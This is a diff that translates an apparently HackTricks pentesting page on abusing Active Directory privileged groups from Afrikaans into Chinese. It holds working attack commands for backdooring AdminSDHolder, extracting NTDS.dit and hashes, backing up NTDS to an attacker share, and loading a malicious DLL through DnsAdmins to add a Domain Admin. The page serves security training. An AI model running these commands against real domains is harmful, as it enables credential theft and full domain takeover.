@@ -1,111 +1,111 @@
-# Bevoorregte Groepe
+# 特权组
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
-Kry Toegang Vandag:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+今天就获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
-## Bekende groepe met administratiewe voorregte
+## 具有管理权限的知名组
 
-* **Administrateurs**
-* **Domein Administrateurs**
-* **Enterprise Administrateurs**
+* **管理员**
+* **域管理员**
+* **企业管理员**
 
-## Rekening Operateurs
+## 账户操作员
 
-Hierdie groep is bemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Boonop stel dit plaaslike aanmelding op die Domein Beheerder (DC) in staat.
+该组有权创建不属于域管理员的账户和组。此外，它还允许本地登录到域控制器 (DC)。
 
-Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
+要识别该组的成员，可以执行以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Account Operators" -Recurse
 ```
-Adding new users is toegelaat, sowel as plaaslike aanmelding by DC01.
+添加新用户是被允许的，同时也可以在 DC01 上进行本地登录。
 
-## AdminSDHolder groep
+## AdminSDHolder 组
 
-Die **AdminSDHolder** groep se Toegangsbeheerlis (ACL) is van kardinale belang aangesien dit toestemmings vir alle "beskermde groepe" binne Active Directory stel, insluitend hoë-toegangs groepe. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongeoorloofde wysigings te voorkom.
+**AdminSDHolder** 组的访问控制列表 (ACL) 至关重要，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全。
 
-'n Aanvaller kan hiervan gebruik maak deur die **AdminSDHolder** groep se ACL te wysig, wat volle toestemmings aan 'n standaard gebruiker gee. Dit sou daardie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit binne 'n uur outomaties hersteld word weens die stelsel se ontwerp.
+攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，从而授予标准用户完全的权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们将在一小时内自动恢复。
 
-Opdragte om die lede te hersien en toestemmings te wysig sluit in:
+审查成员和修改权限的命令包括：
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
 ```
-'n Skrip is beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).
+一个脚本可用于加速恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。
 
-Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).
+有关更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。
 
-## AD Herwinningsblik
+## AD 回收站
 
-Lidmaatskap in hierdie groep maak dit moontlik om verwyderde Active Directory-objekte te lees, wat sensitiewe inligting kan onthul:
+该组的成员资格允许读取已删除的 Active Directory 对象，这可能会泄露敏感信息：
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Domeinbeheerder Toegang
+### 域控制器访问
 
-Toegang tot lêers op die DC is beperk tensy die gebruiker deel is van die `Server Operators` groep, wat die vlak van toegang verander.
+对DC上文件的访问受到限制，除非用户是`Server Operators`组的一部分，这会改变访问级别。
 
-### Privilege Escalation
+### 权限提升
 
-Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n mens diensregte inspekteer en wysig. Die `Server Operators` groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van arbitrêre opdragte en privilege escalasie toelaat:
+使用Sysinternals的`PsService`或`sc`，可以检查和修改服务权限。例如，`Server Operators`组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
-Hierdie opdrag onthul dat `Server Operators` volle toegang het, wat die manipulasie van dienste vir verhoogde privaathede moontlik maak.
+此命令显示 `Server Operators` 拥有完全访问权限，从而能够操纵服务以获取提升的权限。
 
-## Rugsteun Operateurs
+## 备份操作员
 
-Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêerstelsel as gevolg van die `SeBackup` en `SeRestore` privaathede. Hierdie privaathede stel vouer traversering, lysing, en lêer kopieer vermoëns in staat, selfs sonder eksplisiete toestemmings, met die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Dit is nodig om spesifieke skripte vir hierdie proses te gebruik.
+加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和文件复制成为可能，即使没有明确的权限，也可以使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。
 
-Om groepslede te lys, voer uit:
+要列出组成员，请执行：
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
-### Plaaslike Aanval
+### 本地攻击
 
-Om hierdie voorregte plaaslik te benut, word die volgende stappe gebruik:
+要在本地利用这些权限，采用以下步骤：
 
-1. Importeer nodige biblioteke:
+1. 导入必要的库：
 ```bash
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-2. Aktiveer en verifieer `SeBackupPrivilege`:
+2. 启用并验证 `SeBackupPrivilege`：
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
-3. Toegang tot en kopieer lêers vanaf beperkte gidse, byvoorbeeld:
+3. 访问并复制受限目录中的文件，例如：
 ```bash
 dir C:\Users\Administrator\
 Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
 ```
-### AD-aanval
+### AD 攻击
 
-Direkte toegang tot die Domeinbeheerder se lêerstelsel stel die diefstal van die `NTDS.dit` databasis moontlik, wat alle NTLM-hashes vir domein gebruikers en rekenaars bevat.
+直接访问域控制器的文件系统允许窃取 `NTDS.dit` 数据库，该数据库包含所有域用户和计算机的 NTLM 哈希。
 
-#### Gebruik diskshadow.exe
+#### 使用 diskshadow.exe
 
-1. Skep 'n skaduwee-kopie van die `C` skyf:
+1. 创建 `C` 盘的影子副本：
 ```cmd
 diskshadow.exe
 set verbose on
@@ -118,27 +118,27 @@ expose %cdrive% F:
 end backup
 exit
 ```
-2. Kopieer `NTDS.dit` van die skaduwee-kopie:
+2. 从影子副本中复制 `NTDS.dit`：
 ```cmd
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
-Alternatiewelik, gebruik `robocopy` vir lêer kopieer:
+或者，使用 `robocopy` 进行文件复制：
 ```cmd
 robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 ```
-3. Trek `SYSTEM` en `SAM` uit vir hash-herwinning:
+3. 提取 `SYSTEM` 和 `SAM` 以获取哈希：
 ```cmd
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. Verkry alle hashes van `NTDS.dit`:
+4. 从 `NTDS.dit` 中检索所有哈希：
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
-#### Gebruik wbadmin.exe
+#### 使用 wbadmin.exe
 
-1. Stel NTFS-lêerstelsel op vir SMB-bediener op die aanvaller masjien en kas SMB-akkrediteer op die teiken masjien.
-2. Gebruik `wbadmin.exe` vir stelselsrugsteun en `NTDS.dit` ekstraksie:
+1. 在攻击者机器上设置 NTFS 文件系统以用于 SMB 服务器，并在目标机器上缓存 SMB 凭据。
+2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
 ```cmd
 net use X: \\<AttackIP>\sharename /user:smbuser password
 echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
@@ -146,19 +146,19 @@ wbadmin get versions
 echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
 ```
 
-Vir 'n praktiese demonstrasie, sien [DEMO VIDEO MET IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).
+有关实际演示，请参见 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。
 
 ## DnsAdmins
 
-Lede van die **DnsAdmins** groep kan hul voorregte benut om 'n arbitrêre DLL met SYSTEM voorregte op 'n DNS-bediener te laai, wat dikwels op Domein Beheerders gehos is. Hierdie vermoë bied 'n beduidende uitbuitingspotensiaal.
+**DnsAdmins** 组的成员可以利用他们的权限在 DNS 服务器上加载具有 SYSTEM 权限的任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。
 
-Om lede van die DnsAdmins-groep te lys, gebruik:
+要列出 DnsAdmins 组的成员，请使用：
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-### Voer arbitrêre DLL uit
+### 执行任意 DLL
 
-Lede kan die DNS-bediener dwing om 'n arbitrêre DLL (of plaaslik of vanaf 'n afstanddeel) te laai met behulp van opdragte soos:
+成员可以使用以下命令使 DNS 服务器加载任意 DLL（无论是本地的还是来自远程共享的）：
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -178,81 +178,81 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Herstart die DNS-diens (wat dalk addisionele toestemmings vereis) is nodig vir die DLL om gelaai te word:
+重新启动 DNS 服务（这可能需要额外的权限）是加载 DLL 所必需的：
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-For more details on this attack vector, refer to ired.team.
+对于此攻击向量的更多细节，请参考 ired.team。
 
 #### Mimilib.dll
-Dit is ook haalbaar om mimilib.dll te gebruik vir opdraguitvoering, dit aan te pas om spesifieke opdragte of omgekeerde shells uit te voer. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.
+使用 mimilib.dll 进行命令执行也是可行的，可以修改它以执行特定命令或反向 shell。 [查看此帖子](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 以获取更多信息。
 
-### WPAD Record for MitM
-DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD-rekord te skep nadat die globale navraagbloklys gedeaktiveer is. Gereedskap soos Responder of Inveigh kan gebruik word vir spoofing en om netwerkverkeer te vang.
+### WPAD 记录用于 MitM
+DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行中间人 (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗和捕获网络流量。
 
-### Event Log Readers
-Lede kan toegang tot gebeurtenislogboekke hê, wat moontlik sensitiewe inligting soos platte wagwoorde of opdraguitvoeringsbesonderhede kan bevat:
+### 事件日志读取器
+成员可以访问事件日志，可能会找到敏感信息，例如明文密码或命令执行细节：
 ```powershell
 # Get members and search logs for sensitive information
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Exchange Windows Permissies
-Hierdie groep kan DACLs op die domein objek wysig, wat moontlik DCSync bevoegdhede toeken. Tegnieke vir bevoegdheidstoename wat hierdie groep benut, is in die Exchange-AD-Privesc GitHub repo uiteengesit.
+## Exchange Windows 权限
+该组可以修改域对象上的 DACL，可能授予 DCSync 权限。利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub 仓库。
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
-## Hyper-V Administrators
-Hyper-V Administrators het volle toegang tot Hyper-V, wat benut kan word om beheer oor virtualiseerde Domein Beheerders te verkry. Dit sluit die kloon van lewende DB's en die onttrekking van NTLM hashes uit die NTDS.dit-lêer in.
+## Hyper-V 管理员
+Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控制虚拟化的域控制器。这包括克隆实时域控制器和从 NTDS.dit 文件中提取 NTLM 哈希。
 
-### Exploitation Example
-Firefox se Mozilla Maintenance Service kan deur Hyper-V Administrators benut word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n harde skakel na 'n beskermde SYSTEM-lêer en dit vervang met 'n kwaadwillige uitvoerbare lêer:
+### 利用示例
+Hyper-V 管理员可以利用 Firefox 的 Mozilla 维护服务以 SYSTEM 身份执行命令。这涉及创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Note: Hard link exploitation has been mitigated in recent Windows updates.
+注意：硬链接利用在最近的Windows更新中已被缓解。
 
-## Organisasie Bestuur
+## 组织管理
 
-In omgewings waar **Microsoft Exchange** ontplooi is, hou 'n spesiale groep bekend as **Organisasie Bestuur** beduidende vermoëns. Hierdie groep het die voorreg om **toegang te hê tot die posbusse van alle domein gebruikers** en handhaaf **volledige beheer oor die 'Microsoft Exchange Security Groups'** Organisatoriese Eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat uitgebuit kan word vir voorreg eskalasie.
+在部署了**Microsoft Exchange**的环境中，一个特殊的组称为**组织管理**，拥有重要的能力。该组有权**访问所有域用户的邮箱**，并对“Microsoft Exchange安全组”组织单位（OU）保持**完全控制**。这种控制包括**`Exchange Windows Permissions`**组，该组可以被利用进行权限提升。
 
-### Voorreg Uitbuiting en Opdragte
+### 权限利用和命令
 
-#### Druk Operateurs
-Lede van die **Druk Operateurs** groep is toegerus met verskeie voorregte, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om **lokaal aan te meld by 'n Domein Beheerder**, dit af te sluit, en drukkers te bestuur. Om hierdie voorregte te benut, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om Gebruikersrekeningbeheer (UAC) te omseil.
+#### 打印操作员
+**打印操作员**组的成员被赋予多个权限，包括**`SeLoadDriverPrivilege`**，这使他们能够**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些权限，特别是当**`SeLoadDriverPrivilege`**在未提升的上下文中不可见时，绕过用户帐户控制（UAC）是必要的。
 
-Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
+要列出该组的成员，可以使用以下PowerShell命令：
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Vir meer gedetailleerde eksploitasiemetodes rakende **`SeLoadDriverPrivilege`**, moet 'n mens spesifieke sekuriteitsbronne raadpleeg.
+对于与 **`SeLoadDriverPrivilege`** 相关的更详细的利用技术，应咨询特定的安全资源。
 
-#### Remote Desktop Users
-Die lede van hierdie groep word toegang tot rekenaars via Remote Desktop Protocol (RDP) toegestaan. Om hierdie lede te tel, is PowerShell-opdragte beskikbaar:
+#### 远程桌面用户
+该组的成员通过远程桌面协议 (RDP) 获得对 PC 的访问权限。要枚举这些成员，可以使用 PowerShell 命令：
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
 ```
-Verder insigte in die ontginning van RDP kan gevind word in toegewyde pentesting hulpbronne.
+进一步了解利用 RDP 的信息可以在专门的渗透测试资源中找到。
 
-#### Afgeleë Bestuur Gebruikers
-Lede kan toegang verkry tot rekenaars oor **Windows Remote Management (WinRM)**. Opname van hierdie lede word bereik deur:
+#### 远程管理用户
+成员可以通过 **Windows 远程管理 (WinRM)** 访问 PC。通过以下方式枚举这些成员：
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
 ```
-Vir eksploitasiemetodes wat verband hou met **WinRM**, moet spesifieke dokumentasie geraadpleeg word.
+对于与 **WinRM** 相关的利用技术，应参考特定文档。
 
-#### Bediener Operateurs
-Hierdie groep het toestemming om verskeie konfigurasies op Domein Beheerders uit te voer, insluitend rugsteun en herstel regte, die verandering van stelseltijd, en die afsluiting van die stelsel. Om die lede te tel, is die opdrag wat verskaf word:
+#### 服务器操作员
+该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要列举成员，可以使用以下命令：
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
-## Verwysings <a href="#references" id="references"></a>
+## References <a href="#references" id="references"></a>
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
 * [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
@@ -271,22 +271,22 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei te outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapstoestelle.\
-Kry Toegang Vandag:
+使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
+今天就获取访问权限：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsieplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
